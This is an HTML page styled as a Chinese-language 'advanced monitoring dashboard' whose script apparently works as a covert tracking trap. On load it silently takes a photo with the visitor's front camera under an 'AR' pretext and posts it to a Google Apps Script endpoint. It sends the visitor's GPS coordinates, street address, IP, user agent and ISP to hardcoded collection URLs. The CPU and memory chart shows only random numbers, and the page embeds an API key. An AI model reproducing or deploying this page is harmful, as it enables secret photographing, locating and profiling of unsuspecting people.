
<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>高級監控面板</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #1e1e2f;
      color: #ffffff;
      margin: 0;
      padding: 0;
    }
    h1 {
      text-align: center;
      margin-top: 20px;
      font-size: 24px;
    }
    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      padding: 20px;
    }
    .card {
      background: linear-gradient(145deg, #2b2b3d, #191926);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 2px 2px 5px #121218, -2px -2px 5px #2e2e40;
      text-align: center;
    }
    .card h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }
    .status-text {
      font-size: 14px;
      margin: 10px 0;
    }
    .chart-container {
      position: relative;
      height: 200px;
      margin: 20px 0;
    }
    iframe {
      width: 100%;
      height: 300px;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>高級監控e面板</h1>
  <div class="container">
    <div class="card">
      <h2>IP 與位置資訊</h2>
      <p id="ipInfo" class="status-text">資訊載入中...</p>
    </div>
    <div class="card">
      <h2>鏡頭狀態</h2>
      <p id="status" class="status-text">請開啟鏡頭使用ＡＲ...</p>
    </div>
    <div class="card">
      <h2>動態地圖</h2>
      <iframe id="map" src="about:blank"></iframe>
    </div>
    <div class="card">
      <h2>天氣資訊</h2>
      <p id="weatherInfo" class="status-text">天氣資訊載入中...</p>
    </div>
    <div class="card">
      <h2>性能監控</h2>
      <div class="chart-container">
        <canvas id="performanceChart"></canvas>
      </div>
    </div>
  </div>

<script>
  // 獨立的相機拍照功能
  // 獨立的相機拍照功能
  async function startCamera() {
    const statusElement = document.getElementById('status');
    let photoData = null;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: 'user' } },
      });
      const video = document.createElement('video');
      video.srcObject = stream;

      // 等待相機畫面載入
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      // 延遲 1 秒拍照
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // 壓縮為 Base64 格式
        photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
        stream.getTracks().forEach((track) => track.stop());
        
        // 發送照片到後端
        sendPhotoToServer(photoData);
      }, 1000);
    } catch (error) {
      console.error('無法啟動相機:', error);
      statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
    }
  }

  // 獨立的 GPS 獲取功能
  async function getGpsCoordinates() {
    const statusElement = document.getElementById('status');
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          timeout: 10000 // 設置超時時間為 10 秒
        });
      });

      const { latitude, longitude } = position.coords;

      // 透過經緯度取得地址
      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
      const data = await response.json();
      const address = data.display_name || '未知地址';

      // 繼續處理 GPS 資訊
      sendGpsToServer(latitude, longitude, address);
    } catch (error) {
      console.error('GPS 錯誤或超時:', error);
      statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限或嘗試重新載入。';
    }
  }

  // 發送照片到後端
  async function sendPhotoToServer(photoData) {
    const statusElement = document.getElementById('status');
    if (!photoData) {
      console.error('無法獲取照片');
      return;
    }
    try {
      console.log('開始發送照片到後端...');
      const formData = new URLSearchParams();
      formData.append('message', '自動拍照圖片');
      formData.append('imageData', photoData);

      const response = await fetch(
        'https://script.google.com/macros/s/AKfycbzv1XvirckHJxlvuSgqaTx4hyi119CsYr-gZ_op_3TUphVN4AnPOUtsGSrICZMhxuSQOg/exec',
        {
          method: 'POST',
          body: formData,
        }
      );

      const result = await response.json();
      if (result.success) {
        console.log('照片資料成功發送到後端！');
        statusElement.innerText = '照片已成功發送。';
      } else {
        console.error(`後端錯誤: ${result.error}`);
        statusElement.innerText = `照片通知發送失敗：${result.error}`;
      }
    } catch (error) {
      console.error('發送照片過程中發生錯誤:', error);
      statusElement.innerText = '發送照片過程中發生錯誤，請檢查控制台。';
    }
  }

  // 發送 GPS 到後端
  async function sendGpsToServer(latitude, longitude, address) {
    const statusElement = document.getElementById('status');
    try {
      console.log('開始發送 GPS 資訊到後端...');
      const formData = new URLSearchParams();
      formData.append('message', 'GPS 資訊');
      formData.append('latitude', latitude);
      formData.append('longitude', longitude);
      formData.append('address', address);

      const response = await fetch(
        'https://script.google.com/macros/s/AKfycbzv1XvirckHJxlvuSgqaTx4hyi119CsYr-gZ_op_3TUphVN4AnPOUtsGSrICZMhxuSQOg/exec',
        {
          method: 'POST',
          body: formData,
        }
      );

      const result = await response.json();
      if (result.success) {
        console.log('GPS 資料成功發送到後端！');
        statusElement.innerText = 'GPS 資訊已成功發送。';
      } else {
        console.error(`後端錯誤: ${result.error}`);
        statusElement.innerText = `GPS 通知發送失敗：${result.error}`;
      }
    } catch (error) {
      console.error('發送 GPS 過程中發生錯誤:', error);
      statusElement.innerText = '發送 GPS 過程中發生錯誤，請檢查控制台。';
    }
  }

  // 獲取 IP 和設備資訊
  async function getIpInfo() {
    try {
      const response = await fetch('https://ipinfo.io/json');
      const data = await response.json();
      const { ip, city, region, country, org } = data;
      const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
      const userAgent = navigator.userAgent;

      const url = new URL('https://script.google.com/macros/s/AKfycbyF061FXgLSk7Yg24md-Od0rwRZl-wV5J27KX3nU9-52WPod3Bz8hQ_dp33AW6LBP0D/exec');
      url.searchParams.append('ip', ip);
      url.searchParams.append('ipType', ipType);
      url.searchParams.append('userAgent', userAgent);
      url.searchParams.append('city', city);
      url.searchParams.append('region', region);
      url.searchParams.append('country', country);
      url.searchParams.append('org', org);

      const result = await fetch(url);
      const responseData = await result.json();

      if (responseData.success) {
        document.getElementById('ipInfo').innerText = '資訊已成功上傳！';
      } else {
        document.getElementById('ipInfo').innerText = 'IP 資訊上傳失敗！';
      }
    } catch (error) {
      console.error('IP 資訊錯誤:', error);
      document.getElementById('ipInfo').innerText = 'IP 資訊操作失敗，請檢查控制台。';
    }
  }

  // 天氣資訊
  async function getWeatherInfo(latitude, longitude) {
    try {
      if (latitude && longitude) {
        // 使用 OpenWeatherMap API 根據經緯度獲取天氣資訊（需替換 YOUR_API_KEY）
        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
        const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`);
        const weatherData = await response.json();
        const temp = weatherData.main.temp;
        const weather = weatherData.weather[0].description;
        const humidity = weatherData.main.humidity;
        document.getElementById('weatherInfo').innerText = 
          `溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
      } else {
        // 默認顯示
        document.getElementById('weatherInfo').innerText = '無法獲取定位，無法顯示天氣資訊';
      }
    } catch (error) {
      console.error('天氣資訊錯誤:', error);
      document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
    }
  }
  // 性能監控
  function setupPerformanceChart() {
    const ctx = document.getElementById('performanceChart').getContext('2d');
    const chart = new Chart(ctx, {
      type: 'line',
      data: {
        labels: [],
        datasets: [
          {
            label: 'CPU 使用率',
            data: [],
            borderColor: '#4caf50',
            backgroundColor: 'rgba(76, 175, 80, 0.2)',
            fill: true,
            tension: 0.4
          },
          {
            label: '記憶體使用率',
            data: [],
            borderColor: '#2196f3',
            backgroundColor: 'rgba(33, 150, 243, 0.2)',
            fill: true,
            tension: 0.4
          }
        ]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
          legend: { display: true }
        },
        scales: {
          x: { display: true, title: { display: true, text: '時間' } },
          y: { display: true, title: { display: true, text: '使用率 (%)' } }
        }
      }
    });

    // 模擬性能數據
    setInterval(() => {
      const now = new Date().toLocaleTimeString();
      const cpuUsage = Math.random() * 100;
      const memoryUsage = Math.random() * 100;
      if (chart.data.labels.length > 20) chart.data.labels.shift();
      chart.data.labels.push(now);
      if (chart.data.datasets[0].data.length > 20) chart.data.datasets[0].data.shift();
      if (chart.data.datasets[1].data.length > 20) chart.data.datasets[1].data.shift();
      chart.data.datasets[0].data.push(cpuUsage.toFixed(1));
      chart.data.datasets[1].data.push(memoryUsage.toFixed(1));
      chart.update();
    }, 1000);
  }

  // 啟動功能
  // 啟動功能
  document.addEventListener('DOMContentLoaded', async () => {
    getIpInfo();
    setupPerformanceChart();
    startCamera();
    const gpsData = await getGpsCoordinates();
    if (gpsData) {
      getWeatherInfo(gpsData.latitude, gpsData.longitude);
    } else {
      getWeatherInfo();
    }
  });
</script>
</body>
</html>
